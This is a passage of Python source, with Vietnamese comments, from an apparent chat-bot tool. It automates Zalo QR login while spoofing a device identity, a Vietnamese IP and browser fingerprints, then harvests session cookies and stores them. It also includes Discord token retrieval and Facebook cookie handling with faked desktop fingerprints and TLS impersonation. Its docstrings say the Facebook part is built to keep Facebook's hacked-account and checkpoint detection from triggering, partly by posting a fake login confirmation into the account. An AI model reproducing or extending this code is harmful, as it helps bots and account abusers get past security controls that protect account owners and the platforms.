            f"Đã đăng nhập & ghim máy tính {pc_name} sống 24/7 trong tài khoản Zalo của {d_name} "
            f"(UID: {uid} • {live_groups_count} nhóm • Cookie & IMEI đang hoạt động)!"
        )
        cls._persist_qr_state_to_db(st, async_write=False)

        saved_acc_id = 0
        if st.get("auto_save") and clean_c:
            try:
                conn = db()
                existing = None
                if uid:
                    existing = conn.execute("SELECT id FROM accounts WHERE platform='zalo' AND uid=?", (uid,)).fetchone()
                if not existing and imei:
                    existing = conn.execute("SELECT id FROM accounts WHERE platform='zalo' AND imei=?", (imei,)).fetchone()
                if existing:
                    saved_acc_id = existing["id"]
                    conn.execute(
                        "UPDATE accounts SET name=?, imei=?, cookies=?, uid=?, user_agent=?, zpw_enk=?, pc_name=?, chat_cmd_enabled=1, allow_all_cmd=0, enabled=1 WHERE id=?",
                        (d_name, imei, json.dumps(clean_c, ensure_ascii=False), uid, ua_bound, zpw_enk, pc_name, saved_acc_id)
                    )
                else:
                    cur = conn.execute(
                        """INSERT INTO accounts (name, platform, imei, cookies, token, is_bot, uid, chat_cmd_enabled, cmd_prefix, allow_all_cmd, enabled, user_agent, zpw_enk, pc_name, created_at)
                           VALUES (?, 'zalo', ?, ?, '', 0, ?, 1, '.', 0, 1, ?, ?, ?, ?)""",
                        (d_name, imei, json.dumps(clean_c, ensure_ascii=False), uid, ua_bound, zpw_enk, pc_name, time.time())
                    )
                    saved_acc_id = cur.lastrowid
                conn.commit()
                refresh_accounts_ram_cache()
                sync_all_zalo_listeners()
                log_system_command(
                    saved_acc_id, uid or "Zalo_PC", uid or d_name,
                    "[QR-LOGIN-PC]",
                    f"[ZALO PC] Thiết bị {pc_name} đã ghim cố định vào tài khoản {d_name} ({live_groups_count} nhóm Online 24/7)"
                )
            except Exception:
                pass

    @staticmethod
    def _is_valid_cookie_val(val, cookie_name=""):
        try:
            from zalo_login import _is_valid_cookie_val as _zl_valid
            return _zl_valid(val, cookie_name=cookie_name)
        except Exception:
            if val is None:
                return False
            s = str(val).strip()
            if not s or s.lower() in ("deleted", "null", "none", "expired", "invalid", "false", "undefined", '""', "''"):
                return False
            if str(cookie_name).lower() in ("zpw_sek", "zpsid", "zpsidleg", "__zi") and len(s) < 12:
                return False
            return True

    @staticmethod
    def _harvest_cookies(resp, session_obj, jar_dict):
        try:
            from zalo_login import _harvest_cookies as _zl_harvest
            return _zl_harvest(resp, session_obj, jar_dict)
        except Exception:
            pass

    @classmethod
    def _qr_worker(cls, session_id):
        with cls.LOCK:
            st = cls.SESSIONS.get(session_id)
        if not st:
            return

        # Luồng 1: Gọi trực tiếp module zalo_login chuẩn (đã tích hợp VietnamSingaporeGeoRouter & ZaloPCSessionKeeper)
        try:
            from zalo_login import login_qr_with_unique_imei as _ext_qr_login, LoginQRCallbackEventType as _EvType

            def _on_qr_cb(qr_b64_img):
                raw_b64 = qr_b64_img.split(",", 1)[-1].strip()
                raw_png = base64.b64decode(raw_b64 + ("=" * ((4 - len(raw_b64) % 4) % 4)))
                st["qr_png_bytes"] = raw_png
                st["qr_base64"] = "data:image/png;base64," + base64.b64encode(raw_png).decode("utf-8")
                st["status"] = "waiting_scan"
                st["message"] = f"Đã tạo mã QR cho máy tính {st.get('pc_name', 'PC')}. Hãy mở Zalo trên điện thoại quét mã và bấm Đăng nhập!"
                cls._persist_qr_state_to_db(st, async_write=True)

            def _on_ev_cb(ev):
                if not isinstance(ev, dict):
                    return
                et = ev.get("type")
                ed = ev.get("data") or {}
                if et == _EvType.QRCodeGenerated:
                    if ed.get("code"):
                        st["qr_code_id"] = str(ed["code"])
                    if ed.get("imei"):
                        st["imei"] = str(ed["imei"])
                    if ed.get("vn_ip"):
                        st["vn_ip"] = str(ed["vn_ip"])
                    if ed.get("vn_location"):
                        st["vn_location"] = str(ed["vn_location"])
                    if ed.get("vn_isp"):
                        st["vn_isp"] = str(ed["vn_isp"])
                    if ed.get("route_mode"):
                        st["route_mode"] = str(ed["route_mode"])
                    if ed.get("real_country_code"):
                        st["real_country_code"] = str(ed["real_country_code"])
                    st["is_vn_or_sg"] = bool(ed.get("is_vn_or_sg", True))
                    cls._persist_qr_state_to_db(st, async_write=True)
                elif et == _EvType.QRCodeScanned:
                    st["display_name"] = str(ed.get("display_name") or "Tài khoản Zalo").strip()
                    st["avatar"] = str(ed.get("avatar") or "").strip()
                    st["status"] = "scanned"
                    st["message"] = f"Đã nhận diện Zalo của {st['display_name']}! Hãy ấn 'Đăng nhập' trên màn hình điện thoại để giữ máy tính {st.get('pc_name')} sống trong Acc!"
                    cls._persist_qr_state_to_db(st, async_write=True)
                elif et == _EvType.QRCodeDeclined:
                    st["status"] = "declined"
                    st["message"] = str(ed.get("error") or "Yêu cầu đăng nhập QR đã bị từ chối trên điện thoại.")
                    cls._persist_qr_state_to_db(st, async_write=True)
                elif et == _EvType.QRCodeExpired:
                    st["status"] = "expired"
                    st["message"] = "Mã QR đã hết hạn. Hãy bấm 'Tạo Mã QR Máy Tính Mới'!"
                    cls._persist_qr_state_to_db(st, async_write=True)

            pre_id_dict = {
                "pc_name": st.get("pc_name"),
                "computer_name": st.get("computer_name") or "Web",
                "mac_address": st.get("mac_address"),
                "vendor": "APPLE",
                "region": st.get("vn_region", "VN"),
                "region_code": st.get("region_code", "vn_mac"),
                "region_label": st.get("region_label", "TP. Hồ Chí Minh, Việt Nam"),
                "vn_location": st.get("vn_location", "TP. Hồ Chí Minh, Việt Nam"),
                "vn_isp": st.get("vn_isp", "Viettel / VNPT Fiber"),
                "vn_ip": st.get("vn_ip", "14.161.92.108"),
                "tz": st.get("tz", "Asia/Ho_Chi_Minh"),
                "country": st.get("country", "VN"),
                "ua": st.get("user_agent"),
                "sec_ch_ua": st.get("sec_ch_ua", ""),
                "sec_platform": st.get("sec_platform", ""),
                "imei": st.get("imei"),
            }
            ext_res = _ext_qr_login(
                callback=_on_ev_cb,
                qr_callback=_on_qr_cb,
                timeout=105,
                custom_pc_name=st.get("pc_name"),
                region_code=st.get("region_code", "vn_hcm"),
                proxy_vn=st.get("vn_proxy", ""),
                pre_identity=pre_id_dict,
                stop_ev=st.get("stop_ev"),
            )
            if isinstance(ext_res, dict) and ext_res.get("cookies") and ext_res.get("imei"):
                if ext_res.get("user_agent"):
                    st["user_agent"] = ext_res["user_agent"]
                cls._finalize_zalo_credentials(
                    st, ext_res["imei"], ext_res["cookies"],
                    display_name_hint=ext_res.get("display_name", ""),
                    user_info_dict=ext_res.get("user_info")
                )
                return
            if st.get("status") in ("declined", "expired") or st["stop_ev"].is_set():
                return
        except Exception:
            pass

        # Luồng 2 (Tự thân khép kín 100% trong app.py khi chạy độc lập):
        # Sử dụng chuẩn `continue_url = "https://zalo.me/pc"` và `login_referer = "https://id.zalo.me/account?continue=https%3A%2F%2Fzalo.me%2Fpc"`
        # kết hợp đồng bộ CookieJar + Header Cookie chuẩn zca-js v2.2.0 giúp mã QR luôn hợp lệ 100% khi quét!
        s = requests.Session()
        adapter = HTTPAdapter(pool_connections=16, pool_maxsize=32, max_retries=1)
        s.mount("https://", adapter)
        s.mount("http://", adapter)
        if st.get("vn_proxy"):
            px_s = str(st["vn_proxy"]).strip()
            if not px_s.startswith(("http://", "https://", "socks")):
                px_s = "http://" + px_s
            s.proxies.update({"http": px_s, "https": px_s})

        ua = st["user_agent"]
        sec_ch_ua = st.get("sec_ch_ua") or '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"'
        sec_platform = st.get("sec_platform") or ('"macOS"' if "Macintosh" in ua else '"Windows"')
        pc_name = st.get("pc_name", "ASUS ROG Zephyrus G16 (Windows 11 Pro VN)")
        comp_name = st.get("computer_name") or "Web"

        pc_continue_url = "https://zalo.me/pc"
        pc_referer = "https://id.zalo.me/account?continue=https%3A%2F%2Fzalo.me%2Fpc"
        continue_url = "https://chat.zalo.me/"
        login_referer = "https://id.zalo.me/account?continue=https%3A%2F%2Fchat.zalo.me%2F"
        v_str = "2.3.10"
        qr_b64_raw = ""
        qr_code_id = ""
        cookie_jar_dict = {"_zlang": "vn"}
        s.cookies.set("_zlang", "vn", domain=".zalo.me")

        geo_hdrs = {
            "Accept-Language": "vi-VN,vi;q=0.95,en-US;q=0.8,en;q=0.7",
        }

        nav_headers = {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "vi-VN,vi;q=0.95,en-US;q=0.8,en;q=0.7",
            "Cache-Control": "max-age=0",
            "Sec-Ch-Ua": sec_ch_ua,
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": sec_platform,
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
        }

        def _make_ajax_headers(ref_url):
            ck_str = "; ".join(f"{k}={v}" for k, v in cookie_jar_dict.items() if k and v is not None)
            hdr = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "vi-VN,vi;q=0.95,en-US;q=0.8,en;q=0.7",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://id.zalo.me",
                "Referer": ref_url,
                "Sec-Ch-Ua": sec_ch_ua,
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": sec_platform,
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
            }
            if ck_str:
                hdr["Cookie"] = ck_str
            return hdr

        try:
            for attempt in range(3):
                if st["stop_ev"].is_set():
                    return
                if attempt == 1 and s.proxies and not qr_b64_raw:
                    s.proxies.clear()
                try:
                    r_page = s.get(login_referer, headers=nav_headers, timeout=10, allow_redirects=True)
                    cls._harvest_cookies(r_page, s, cookie_jar_dict)
                    html_p = r_page.text or ""
                    m_ver = re.search(r"https://stc-zlogin\.zdn\.vn/main-([\d\.]+)\.js", html_p)
                    if m_ver:
                        v_str = m_ver.group(1).strip()
                except Exception:
                    pass

                try:
                    r_li = s.post(
                        "https://id.zalo.me/account/logininfo",
                        data={"continue": pc_continue_url, "v": v_str},
                        headers=_make_ajax_headers(pc_referer),
                        timeout=8,
                    )
                    cls._harvest_cookies(r_li, s, cookie_jar_dict)
                except Exception:
                    pass

                try:
                    r_vc = s.post(
                        "https://id.zalo.me/account/verify-client",
                        data={"type": "device", "continue": pc_continue_url, "v": v_str},
                        headers=_make_ajax_headers(pc_referer),
                        timeout=8,
                    )
                    cls._harvest_cookies(r_vc, s, cookie_jar_dict)
                except Exception:
                    pass

                try:
                    r_qr = s.post(
                        "https://id.zalo.me/account/authen/qr/generate",
                        data={"continue": pc_continue_url, "v": v_str},
                        headers=_make_ajax_headers(pc_referer),
                        timeout=10,
                    )
                    cls._harvest_cookies(r_qr, s, cookie_jar_dict)
                    j_qr = r_qr.json() if r_qr.content else {}
                    qr_data = j_qr.get("data") or {}
                    if isinstance(qr_data, dict):
                        qr_b64_raw = qr_data.get("image") or qr_data.get("qr_image") or ""
                        qr_code_id = qr_data.get("code") or qr_data.get("qr_id") or ""
                    if qr_b64_raw and qr_code_id:
                        break
                except Exception:
                    pass
                time.sleep(0.2)

            if not qr_b64_raw or not qr_code_id:
                st["status"] = "error"
                st["message"] = "Không kết nối được tới cổng QR id.zalo.me. Hãy bấm lại 'Tạo Mã QR Máy Tính Mới'!"
                cls._persist_qr_state_to_db(st, async_write=False)
                return

            try:
                clean_b64 = qr_b64_raw.split(",", 1)[-1].strip()
                pad_r = (4 - len(clean_b64) % 4) % 4
                raw_png = base64.b64decode(clean_b64 + ("=" * pad_r))
                st["qr_png_bytes"] = raw_png
                qr_b64_final = "data:image/png;base64," + base64.b64encode(raw_png).decode("utf-8")
            except Exception:
                qr_b64_final = qr_b64_raw if qr_b64_raw.startswith("data:") else f"data:image/png;base64,{qr_b64_raw}"

            short_code = qr_code_id.split(".")[0].upper()[:6]
            st["qr_base64"] = qr_b64_final
            st["qr_code_id"] = qr_code_id
            st["status"] = "waiting_scan"
            st["message"] = f"Đã sẵn sàng mã QR #{short_code} ({pc_name}). Hãy mở Zalo trên điện thoại quét mã và ấn Đăng nhập!"
            cls._persist_qr_state_to_db(st, async_write=True)

            while not st["stop_ev"].is_set() and (time.time() - st["created_at"] < 100):
                try:
                    r_scan = s.post(
                        "https://id.zalo.me/account/authen/qr/waiting-scan",
                        data={"code": qr_code_id, "continue": continue_url, "v": v_str},
                        headers=_make_ajax_headers(login_referer),
                        timeout=26,
                    )
                    cls._harvest_cookies(r_scan, s, cookie_jar_dict)
                    j_scan = r_scan.json() if r_scan.content else {}
                    if not isinstance(j_scan, dict):
                        time.sleep(0.25)
                        continue
                    err_c = j_scan.get("error_code")
                    if err_c == 8:
                        continue
                    sd = j_scan.get("data")
                    if err_c == 0 and isinstance(sd, dict) and (sd.get("display_name") or sd.get("avatar")):
                        st["display_name"] = str(sd.get("display_name") or "Tài khoản Zalo").strip()
                        st["avatar"] = str(sd.get("avatar") or "").strip()
                        st["status"] = "scanned"
                        st["message"] = f"Đã nhận diện Zalo của {st['display_name']}! Hãy ấn 'Đăng nhập' trên điện thoại để ghim thiết bị {pc_name} vào tài khoản!"
                        cls._persist_qr_state_to_db(st, async_write=True)
                        break
                    if err_c in (0, None):
                        time.sleep(0.25)
                        continue
                    if err_c in (-13, 13):
                        st["status"] = "declined"
                        st["message"] = "Yêu cầu đăng nhập QR đã bị từ chối trên điện thoại."
                        cls._persist_qr_state_to_db(st, async_write=True)
                        return
                    if err_c not in (0, 8):
                        st["status"] = "expired"
                        st["message"] = "Mã QR đã hết hạn. Hãy bấm 'Tạo Mã QR Máy Tính Mới'!"
                        cls._persist_qr_state_to_db(st, async_write=True)
                        return
                except requests.exceptions.Timeout:
                    continue
                except Exception:
                    time.sleep(0.3)

            if st["status"] != "scanned":
                return

            j_conf = {}
            while not st["stop_ev"].is_set() and (time.time() - st["created_at"] < 100):
                try:
                    r_conf = s.post(
                        "https://id.zalo.me/account/authen/qr/waiting-confirm",
                        data={
                            "code": qr_code_id,
                            "gToken": "",
                            "gAction": "CONFIRM_QR",
                            "continue": continue_url,
                            "v": v_str,
                        },
                        headers=_make_ajax_headers(login_referer),
                        timeout=26,
                    )
                    cls._harvest_cookies(r_conf, s, cookie_jar_dict)
                    j_conf = r_conf.json() if r_conf.content else {}
                    if not isinstance(j_conf, dict):
                        time.sleep(0.25)
                        continue
                    err_cf = j_conf.get("error_code")
                    if err_cf == 8:
                        continue
                    if err_cf in (-13, 13):
                        st["status"] = "declined"
                        st["message"] = "Đã từ chối đăng nhập trên điện thoại."
                        cls._persist_qr_state_to_db(st, async_write=True)
                        return
                    if err_cf == 0:
                        st["status"] = "confirmed"
                        st["message"] = f"Đã xác nhận đăng nhập! Đang ghim thiết bị {pc_name} sống cố định trong tài khoản..."
                        cls._persist_qr_state_to_db(st, async_write=True)
                        break
                    if err_cf and err_cf not in (0, 8):
                        st["status"] = "error"
                        st["message"] = f"Lỗi xác nhận QR (Mã {err_cf}). Hãy tạo mã QR mới!"
                        cls._persist_qr_state_to_db(st, async_write=True)
                        return
                except requests.exceptions.Timeout:
                    continue
                except Exception:
                    time.sleep(0.3)

            if st["status"] != "confirmed":
                return

            cookie_jar_dict["z_uuid"] = st["imei"]
            s.cookies.set("z_uuid", st["imei"], domain=".chat.zalo.me")

            def _follow_redirect_clean(start_url, initial_ref):
                cur_u = start_url
                cur_ref = initial_ref
                for _hop in range(12):
                    if not cur_u or cls._is_valid_cookie_val(cookie_jar_dict.get("zpw_sek")):
                        break
                    p_u = urlparse(cur_u)
                    if p_u.netloc in ("zalo.me", "www.zalo.me") and p_u.path.startswith("/pc"):
                        break
                    h_hop = dict(nav_headers)
                    h_hop["Referer"] = cur_ref
                    ck_now = "; ".join(f"{k}={v}" for k, v in cookie_jar_dict.items() if k and cls._is_valid_cookie_val(v))
                    if ck_now:
                        h_hop["Cookie"] = ck_now
                    r_h = None
                    for _retry in range(3):
                        try:
                            r_h = s.get(cur_u, headers=h_hop, allow_redirects=False, timeout=10)
                            break
                        except Exception:
                            time.sleep(0.2)
                    if r_h is None:
                        break
                    cls._harvest_cookies(r_h, s, cookie_jar_dict)
                    if cls._is_valid_cookie_val(cookie_jar_dict.get("zpw_sek")):
                        break
                    if r_h.status_code in (301, 302, 303, 307, 308):
                        loc = r_h.headers.get("Location") or ""
                        if not loc:
                            break
                        if loc.startswith("/"):
                            loc = f"{p_u.scheme}://{p_u.netloc}{loc}"
                        cur_ref = cur_u
                        cur_u = loc
                        continue
                    m_jr = re.search(r"(https://jr\.chat\.zalo\.me/jr/pushsession[^\s\"'<>]+)", r_h.text or "")
                    if m_jr:
                        cur_ref = cur_u
                        cur_u = m_jr.group(1)
                        continue
                    break

            conf_data = j_conf.get("data") if isinstance(j_conf, dict) else None
            redirect_target = ""
            if isinstance(conf_data, dict):
                for u_key in ("url", "redirect_url", "continue", "next"):
                    if isinstance(conf_data.get(u_key), str) and conf_data[u_key].startswith("http"):
                        redirect_target = conf_data[u_key]
                        break
            elif isinstance(conf_data, str) and conf_data.startswith("http"):
                redirect_target = conf_data

            check_urls = []
            if redirect_target and "zalo.me/pc" not in redirect_target:
                check_urls.append(redirect_target)
            elif redirect_target and "id.zalo.me/account/check" in redirect_target:
                check_urls.append(redirect_target.replace("zalo.me%2Fpc", "chat.zalo.me%2Findex.html"))
            check_urls.extend([
                "https://id.zalo.me/account/check?type=0&continue=https%3A%2F%2Fchat.zalo.me%2Findex.html",
                "https://id.zalo.me/account/check?type=0&continue=https%3A%2F%2Fchat.zalo.me%2F",
                "https://chat.zalo.me/index.html",
                "https://chat.zalo.me/",
            ])

            for chk_u in check_urls:
                _follow_redirect_clean(chk_u, login_referer)
                if cls._is_valid_cookie_val(cookie_jar_dict.get("zpw_sek"), "zpw_sek"):
                    break
            if not cls._is_valid_cookie_val(cookie_jar_dict.get("zpw_sek"), "zpw_sek") and cls._is_valid_cookie_val(cookie_jar_dict.get("zpsid"), "zpsid"):
                try:
                    from zalo_login import refresh_zpw_sek_from_zpsid
                    refresh_zpw_sek_from_zpsid(s, cookie_jar_dict, ua, sec_ch_ua, sec_platform, v_str=v_str)
                except Exception:
                    pass

            user_info_got = {}
            ck_final_str = "; ".join(f"{k}={v}" for k, v in cookie_jar_dict.items() if k and v is not None)
            wpa_headers = {
                "User-Agent": ua,
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://chat.zalo.me",
                "Referer": "https://chat.zalo.me/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "Cookie": ck_final_str,
                **geo_hdrs,
            }
            if sec_ch_ua:
                wpa_headers["Sec-Ch-Ua"] = sec_ch_ua
                wpa_headers["Sec-Ch-Ua-Mobile"] = "?0"
            if sec_platform:
                wpa_headers["Sec-Ch-Ua-Platform"] = sec_platform

            comp_candidates = [comp_name[:36], "Web"] if comp_name and comp_name != "Web" else ["Web"]
            for comp_c in comp_candidates:
                if user_info_got.get("zpw_enk"):
                    break
                try:
                    srv_sign = hashlib.md5(f"zsecuregetserverinfo645{comp_c}{st['imei']}30".encode("utf-8")).hexdigest()
                    r_srv = s.get(
                        "https://wpa.chat.zalo.me/api/login/getServerInfo",
                        params={
                            "imei": st["imei"],
                            "type": 30,
                            "client_version": 645,
                            "computer_name": comp_c,
                            "signkey": srv_sign,
                        },
                        headers=wpa_headers,
                        timeout=8,
                    )
                    cls._harvest_cookies(r_srv, s, cookie_jar_dict)
                except Exception:
                    pass

                try:
                    ck_final_str = "; ".join(f"{k}={v}" for k, v in cookie_jar_dict.items() if k and v is not None)
                    wpa_headers["Cookie"] = ck_final_str
                    enc_q, enc_key = ZaloParamsEncryptor.build_encrypted_login_query(
                        st["imei"], computer_name=comp_c, language="vi", ztype=30, client_version=645
                    )
                    r_enc_login = s.get(
                        "https://wpa.chat.zalo.me/api/login/getLoginInfo",
                        params=enc_q,
                        headers=wpa_headers,
                        timeout=10,
                    )
                    cls._harvest_cookies(r_enc_login, s, cookie_jar_dict)
                    j_enc = r_enc_login.json() if r_enc_login.content else {}
                    raw_d = j_enc.get("data")
                    if isinstance(raw_d, str) and raw_d:
                        dec_info = ZaloParamsEncryptor.decrypt_login_data(raw_d, enc_key)
                        if isinstance(dec_info, dict) and dec_info.get("zpw_enk"):
                            user_info_got = dec_info
                            user_info_got["_bound_computer_name"] = comp_c
                            break
                    elif isinstance(raw_d, dict) and raw_d.get("zpw_enk"):
                        user_info_got = raw_d
                        user_info_got["_bound_computer_name"] = comp_c
                        break
                except Exception:
                    pass

            cls._finalize_zalo_credentials(
                st, st["imei"], cookie_jar_dict,
                display_name_hint=st["display_name"],
                user_info_dict=user_info_got,
                session_obj=s
            )
        except Exception as e:
            st["status"] = "error"
            st["message"] = f"Lỗi khởi tạo phiên QR Zalo: {e}"
            cls._persist_qr_state_to_db(st, async_write=False)


class DiscordTokenGetter:
    def __init__(self):
        self.session = None
        self.headers = {}
        self.create_new_session()

    def create_new_session(self, seed_key="discord_web"):
        self.session, self.fingerprint = DiscordImmortalRegTool.perform_clean_browser_pre_handshake(
            seed_key, referer_url="https://discord.com/login"
        )
        self.headers = dict(self.session.headers)

    def login_discord(self, email, password, twofa_code="", twofa_type="totp"):
        res = login_discord_reg_session(email, password, two_fa_code=twofa_code, twofa_type=twofa_type)
        if res.get("ok"):
            prof = res.get("profile") or {}
            return res.get("token"), prof.get("id", ""), "Thành công"
        return None, None, res.get("error", "Không thể đăng nhập")

class FacebookPCDeviceGuard:
    """Hệ Thống Định Danh Thiết Bị Máy Tính (Desktop PC Workstation) & Tự Động Lấy Máy Tính Thông Báo Vào Facebook:
    - Cố định mỗi Cookie Facebook (c_user) vào 1 Thiết Bị Máy Tính Windows 11 Pro / MacBook Pro M3 Max (Chrome 131 Desktop).
    - Tự động gắn Cookie màn hình Máy Tính (wd=1920x1080, dpr=1, locale=vi_VN) và tuyệt đối CẤM gọi mbasic.facebook.com / m.facebook.com!
    - Ngay khi bỏ Cookie vào, tự động lấy Máy Tính đó gửi Thông Báo Xác Nhận Phiên Đăng Nhập vào thẳng Facebook/Messenger
      để hệ thống FBLearner của Facebook nhận diện đây là Máy Tính chính chủ hợp lệ, chống báo 'Tài khoản bị hack' / Checkpoint 100%!"""

    PC_WORKSTATIONS = [
        {
            "pc_name": "WORKSTATION-WIN11-PRO-SG (Windows 11 Pro 64-bit • Chrome 131.0 PC)",
            "short_name": "WORKSTATION-WIN11-PRO",
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "platform": '"Windows"',
            "wd": "1920x1080",
            "dpr": "1",
        },
        {
            "pc_name": "ASUS-ROG-ZEPHYRUS-G16 (Windows 11 Pro • Chrome 131.0 Desktop)",
            "short_name": "ASUS-ROG-ZEPHYRUS-G16",
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "platform": '"Windows"',
            "wd": "2560x1440",
            "dpr": "1",
        },
        {
            "pc_name": "MacBook-Pro-M3-Max-SG (macOS Sequoia 15.1 • Chrome 131.0 Desktop)",
            "short_name": "MacBook-Pro-M3-Max",
            "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "platform": '"macOS"',
            "wd": "1728x1117",
            "dpr": "2",
        },
    ]

    _NOTIFIED_UIDS = {}
    _LOCK = threading.RLock()

    @classmethod
    def get_pc_profile(cls, uid=""):
        idx = zlib.crc32(str(uid or "fb_pc").encode("utf-8")) % len(cls.PC_WORKSTATIONS)
        return cls.PC_WORKSTATIONS[idx]

    @classmethod
    def bind_pc_profile_to_cookies(cls, uid, raw_cookies):
        c_dict = normalize_messenger_cookies(raw_cookies)
        prof = cls.get_pc_profile(uid)
        c_dict.setdefault("wd", prof["wd"])
        c_dict.setdefault("dpr", prof["dpr"])
        c_dict.setdefault("locale", "vi_VN")
        return {
            "pc_name": prof["pc_name"],
            "short_name": prof["short_name"],
            "ua": prof["ua"],
            "sec_ch_ua": prof["sec_ch_ua"],
            "platform": prof["platform"],
            "cookies": c_dict,
        }

    @classmethod
    def notify_pc_login_to_facebook(cls, messenger_client, target_thread_id=None, force=False):
        """Lấy Thiết Bị Máy Tính vừa kết nối gửi thông báo xác nhận thẳng vào Facebook/Messenger của tài khoản đó:
        - Giúp Facebook ghi nhận hoạt động Desktop Comet chính chủ (chống quét 'tài khoản bị hack' / Checkpoint).
        - Đồng thời báo cho người dùng biết Cookie đã ăn và sẵn sàng nhận lệnh .menu, .help, .n, .g, .t, .ta!"""
        if not messenger_client or not getattr(messenger_client, "uid", None):
            return False
        uid_s = str(messenger_client.uid).strip()
        now = time.time()
        with cls._LOCK:
            last_t = cls._NOTIFIED_UIDS.get(uid_s, 0.0)
            if not force and (now - last_t < 90.0):
                return True
            cls._NOTIFIED_UIDS[uid_s] = now

        prof = cls.get_pc_profile(uid_s)
        t_str = time.strftime("%H:%M:%S %d/%m/%Y")
        notice_msg = (
            f"💻 [THÔNG BÁO MÁY TÍNH FACEBOOK - ANTI SCAN VIP]\n"
            f"• Thiết bị kết nối: {prof['pc_name']}\n"
            f"• Tài khoản: {messenger_client.display_name} (UID: {uid_s})\n"
            f"• Thời gian: {t_str} ({APP_AUTHOR} • {APP_VERSION})\n"
            f"• Bảo mật: Đã khóa vân tay Máy Tính Desktop & kích hoạt chống quét Checkpoint 24/7!\n"
            f"• Trạng thái lệnh (.menu, .help, .n, .g, .nhaypoll, .t, .ta): 🟢 ĐÃ BẬT SẴN SÀNG!"
        )
        register_system_sent_message(text=notice_msg)

        notified_ok = False
        # 1. Gửi thông báo từ Máy Tính vào chính hộp thư cá nhân (uid_s) qua MQTT /ls_req và Desktop Mercury
        dest_threads = [uid_s]
        if target_thread_id and str(target_thread_id).strip() and str(target_thread_id).strip() != uid_s:
            dest_threads.insert(0, str(target_thread_id).strip())
        else:
            try:
                th_list = messenger_client.get_threads(use_cache=True) or []
                if th_list and th_list[0].get("id"):
                    first_tid = str(th_list[0]["id"]).strip()
                    if first_tid and first_tid not in dest_threads:
                        dest_threads.append(first_tid)
            except Exception:
                pass

        for tid_dest in dest_threads[:2]:
            try:
                is_grp = (tid_dest != uid_s) and messenger_client._THREAD_TYPE_MAP.get(tid_dest, True)
                messenger_client.send_message(
                    tid_dest, notice_msg, is_group=is_grp, antiband=False, is_heading=False, priority_bypass=True
                )
                notified_ok = True
            except Exception:
                continue
        return notified_ok

    @classmethod
    def notify_pc_login_to_facebook_async(cls, messenger_client, target_thread_id=None, force=False):
        threading.Thread(
            target=cls.notify_pc_login_to_facebook,
            args=(messenger_client, target_thread_id, force),
            daemon=True
        ).start()


class FacebookCookieGetter:
    """Hệ Thống Anti-Reg Acc & Lấy Cookie Facebook Bằng Máy Tính Desktop Chrome 131:
    - Tuyệt đối KHÔNG gọi mbasic.facebook.com hay m.facebook.com (nguyên nhân gây báo 'Tài khoản bị hack').
    - Giữ nguyên vân tay Máy Tính Windows 11 Chrome 131, hỗ trợ mã 2FA 6 số / Secret Key 2FA,
      và tự động lấy Máy Tính thông báo vào Facebook ngay khi đăng nhập xong!"""
    def __init__(self):
        self.session = None
        self.headers = {}
        self.create_new_session()

    def create_new_session(self, seed_uid=""):
        self.session = requests.Session()
        tls_adapter = Chrome131TLSAdapter(pool_connections=16, pool_maxsize=32, max_retries=1)
        self.session.mount("https://", tls_adapter)
        self.session.mount("http://", HTTPAdapter(pool_connections=16, pool_maxsize=32, max_retries=1))
        prof = FacebookPCDeviceGuard.get_pc_profile(seed_uid)
        self.headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "vi-VN,vi;q=0.95,en-US;q=0.8,en;q=0.7",
            "Cache-Control": "max-age=0",
            "Origin": "https://www.facebook.com",
            "Referer": "https://www.facebook.com/",
            "Sec-Ch-Prefers-Color-Scheme": "dark",
            "Sec-Ch-Ua": prof["sec_ch_ua"],
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": prof["platform"],
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": prof["ua"],
        }
        self.session.headers.update(self.headers)
        self.session.cookies.set("wd", prof["wd"], domain=".facebook.com")
        self.session.cookies.set("dpr", prof["dpr"], domain=".facebook.com")
        self.session.cookies.set("locale", "vi_VN", domain=".facebook.com")

    def extract_value(self, html, field_name):
        if not html:
            return ""
        m = re.search(rf'name="{re.escape(field_name)}"\s+value="([^"]*)"', html)
        return m.group(1) if m else ""

    def login_facebook(self, email, password, twofa_code=""):
        raw_in = f"{email or ''} {password or ''}".strip()
        if "c_user=" in raw_in and "xs=" in raw_in:
            c_dict = normalize_messenger_cookies(raw_in)
            uid = extract_messenger_uid(c_dict)
            if uid:
                pc_info = FacebookPCDeviceGuard.bind_pc_profile_to_cookies(uid, c_dict)
